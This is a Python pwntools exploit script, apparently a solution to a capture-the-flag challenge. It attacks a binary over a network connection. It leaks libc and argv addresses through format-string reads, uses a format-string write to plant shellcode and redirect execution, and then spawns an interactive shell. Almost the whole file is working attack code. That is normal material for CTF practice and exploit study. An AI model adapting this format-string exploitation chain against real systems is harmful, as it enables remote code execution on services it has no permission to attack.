#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ["zellij", "run", "-c", "--"]
exe = context.binary = ELF(args.EXE or '../dist/chall')
libc = ELF(libcdb.search_by_build_id("a43bfc8428df6623cd498c9c0caeb91aec9be4f9"))

host = args.HOST or '0.0.0.0'
port = int(args.PORT or 10000)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

# leak libc
io.sendline(b"%10$p %47$p")
leaks = io.recvline().split()
libc.address = int(leaks[1], 16) - libc.sym["__libc_start_call_main"] - 128
log.info(f"libc @ 0x{libc.address:x}")
assert libc.address & 0xfff == 0

# leak argv
io.sendline(b"START%14$sEND___" + p64(libc.sym["__libc_argv"]))
io.recvuntil(b"START")
leak = io.recvuntil(b"END", drop=True)
argv = u64(leak.ljust(8, b"\0"))
log.info(f"argv @ 0x{argv:x}")

shellcode = asm(shellcraft.read(0, "rdx", 0x100))
buf_addr = argv - 0x228
sc_addr = int(leaks[0], 16)
log.info(f"shellcode @ 0x{sc_addr:x}")

payload = fmtstr_payload(12, {argv+8: sc_addr, sc_addr: shellcode}, write_size="short") # argv + 8 == argv[1]
assert len(payload) <= 0x100
io.sendline(payload)

io.recvuntil(b"aaaa")
io.recv(6)
io.sendline(asm("nop") * 16 + asm(shellcraft.sh()))

io.interactive()
